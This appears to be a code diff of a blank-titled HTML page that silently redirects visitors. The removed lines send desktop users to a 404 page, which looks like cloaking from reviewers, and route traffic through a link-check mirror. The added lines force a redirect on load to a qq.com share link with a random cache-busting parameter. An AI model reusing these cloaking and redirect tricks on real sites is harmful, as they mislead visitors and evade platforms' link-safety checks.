@@ -1,10 +1,24 @@
-<script>
-	if((/^(Win|Mac)/i.test(navigator.platform)||!/mobile|Android|phone|iPhone|iPod|ios|iPad/i.test(navigator.userAgent))&&(!localStorage.idf||parseInt( conf.mobile))){
-		location = 'http://www.qq.com/babygohome/?pgv_ref=404';
-	}
-</script>
-  <script>
-var currentTimestamp = new Date().getTime();
-console.log(currentTimestamp);
-location.href = "https://tppp8.github.io/uppq.html?https://www.urlshare.cn/umirror_url_check?plateform=mqq.weiyun&url="+currentTimestamp;
-</script>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>.</title>
+</head>
+
+<body>
+
+    <script>
+        let button = document.querySelector('button')
+        const targetUrl = 'https://sharechain.qq.com/71990ee952f2f2469dbb2e2a8f432f27#';
+        const timestamp = Date.now();
+        const randomString = Math.random().toString(36).substring(2);
+        const urlWithParam = `${targetUrl}?timestamp=${timestamp}-${randomString}`;
+        window.onload = function () {
+            window.location.href = urlWithParam;
+        };
+    </script>
+</body>
+
+</html>
